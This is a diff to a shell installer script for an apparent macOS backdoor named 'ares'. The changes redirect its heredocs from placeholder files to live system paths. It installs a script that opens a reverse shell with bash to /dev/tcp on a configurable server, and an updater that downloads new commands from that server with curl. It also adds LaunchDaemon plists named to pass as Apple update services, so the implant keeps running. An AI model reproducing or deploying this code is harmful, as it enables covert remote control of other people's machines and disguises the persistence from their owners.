@@ -31,7 +31,7 @@ echo ""
 echo "Copying files..."
 echo "Copying connect.sh..."
 
-cat <<ENDOFCONNECTSH >> potato
+cat <<ENDOFCONNECTSH >> /Library/.ares/connect.sh
 #!/bin/bash
 bash -i >& /dev/tcp/$SERVER/$PORT 0>&1
 wait
@@ -42,7 +42,7 @@ echo ""
 
 echo "Copying update.sh..."
 
-cat <<ENDOFUPDATESH >> potato2
+cat <<ENDOFUPDATESH >> /Library/.ares/update.sh
 #!/bin/bash
 
 curl -o /Library/.ares/newcommands http://$SERVER/newcommands
@@ -70,7 +70,7 @@ echo "Done."
 echo ""
 
 echo "Copying com.apple.update.plist..."
-cat <<ENDOFCOMAPPLEUPDATE >> potato2
+cat <<ENDOFCOMAPPLEUPDATE >> /Library/LaunchDaemons/com.apple.update.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -96,7 +96,7 @@ echo "Done."
 echo ""
 
 echo "Copying com.apple.ares.plist..."
-cat <<ENDOFCOMAPPLEARES >> potato
+cat <<ENDOFCOMAPPLEARES >> /Library/LaunchDaemons/com.apple.ares.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
